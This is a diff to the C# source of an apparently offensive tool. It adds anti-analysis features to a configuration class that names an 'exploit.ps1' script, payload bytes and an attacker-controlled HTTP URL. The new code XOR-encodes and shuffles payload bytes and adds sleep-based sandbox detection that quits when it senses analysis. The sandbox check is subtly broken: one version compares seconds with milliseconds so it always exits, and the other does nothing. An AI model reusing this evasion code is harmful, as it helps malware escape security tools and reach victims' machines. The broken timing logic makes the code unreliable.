@@ -1,3 +1,7 @@
+using System;
+using System.Runtime.InteropServices;
+
+
 public static class CONFIG
 {
     //Environment Variables
@@ -7,6 +11,12 @@ public static class CONFIG
     public static string POWERSHELL_SCRIPT_NAME = "exploit.ps1";
     public static string WAIT_TIME_SECONDS = "2";
 
+    //Evasion
+    public static bool ENCODED = true;
+    public static byte KEY = 0xf4;
+
+    public static bool DETECT_SANDBOX_TIME = true;
+    public static bool DETECT_SANDBOX_BAD_IMPORT = true;
 
 
 
@@ -65,4 +75,142 @@ public static class CONFIG
         0xd5};
 
     public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
+
+
+    [DllImport("kernel32.dll")]
+    public static extern void Sleep(uint dwMilliseconds);
+
+    public static void SandboxTimeDetect()
+    {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+        if (t2 < 1.5)
+        {
+            return;
+        }
+    }
+}
+
+
+
+public static class Evasion
+{
+    [DllImport("kernel32.dll")]
+    public static extern void Sleep(uint dwMilliseconds);
+
+
+
+
+    public static byte[] Encode(byte[] inputBuffer)
+    {
+        if (inputBuffer == null)
+            throw new ArgumentNullException("inputBuffer");
+
+        int inputLength = inputBuffer.Length;
+        int remainder = inputLength % 2;
+        int midPoint = inputLength / 2;
+
+        byte[] interimBuffer = new byte[inputLength];
+        byte[] outputBuffer = new byte[inputLength];
+
+        // First shuffle
+        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
+        {
+            interimBuffer[j] =
+                unchecked((byte)(inputBuffer[midPoint + i] ^ CONFIG.KEY));
+
+            interimBuffer[j + 1] =
+                unchecked((byte)(inputBuffer[midPoint - i - 1] ^ CONFIG.KEY));
+        }
+
+        if (remainder != 0)
+        {
+            interimBuffer[inputLength - 1] =
+                unchecked((byte)(inputBuffer[inputLength - 1] ^ CONFIG.KEY));
+        }
+
+        // Second shuffle
+        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
+        {
+            outputBuffer[j] =
+                unchecked((byte)(interimBuffer[midPoint + i] ^ i));
+
+            outputBuffer[j + 1] =
+                unchecked((byte)(interimBuffer[midPoint - i - 1] ^ i));
+        }
+
+        if (remainder != 0)
+        {
+            outputBuffer[inputLength - 1] =
+                interimBuffer[inputLength - 1];
+        }
+
+        return outputBuffer;
+    }
+
+    public static byte[] Decode(byte[] inputBuffer)
+    {
+        if (inputBuffer == null)
+            throw new ArgumentNullException("inputBuffer");
+
+        int inputLength = inputBuffer.Length;
+        int remainder = inputLength % 2;
+        int midPoint = inputLength / 2;
+
+        byte[] interimBuffer = new byte[inputLength];
+        byte[] outputBuffer = new byte[inputLength];
+
+        // First unshuffle
+        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
+        {
+            interimBuffer[midPoint + i] =
+                unchecked((byte)(inputBuffer[j] ^ i));
+
+            interimBuffer[midPoint - i - 1] =
+                unchecked((byte)(inputBuffer[j + 1] ^ i));
+        }
+
+        if (remainder != 0)
+        {
+            interimBuffer[inputLength - 1] =
+                inputBuffer[inputLength - 1];
+        }
+
+        // Second unshuffle
+        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
+        {
+            outputBuffer[midPoint + i] =
+                unchecked((byte)(interimBuffer[j] ^ CONFIG.KEY));
+
+            outputBuffer[midPoint - i - 1] =
+                unchecked((byte)(interimBuffer[j + 1] ^ CONFIG.KEY));
+        }
+
+        if (remainder != 0)
+        {
+            outputBuffer[inputLength - 1] =
+                unchecked((byte)(interimBuffer[inputLength - 1] ^ CONFIG.KEY));
+        }
+
+        return outputBuffer;
+    }
+
+
+
+    public static void SandboxTimeDetect()
+    {
+        uint milliseconds = 2000;
+
+        DateTime t1 = DateTime.Now;
+        Sleep(milliseconds);
+        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+        if (t2 < (uint)(milliseconds / 0.75))
+        {
+            Environment.Exit(0);
+        }
+    }
+
+
+
 }
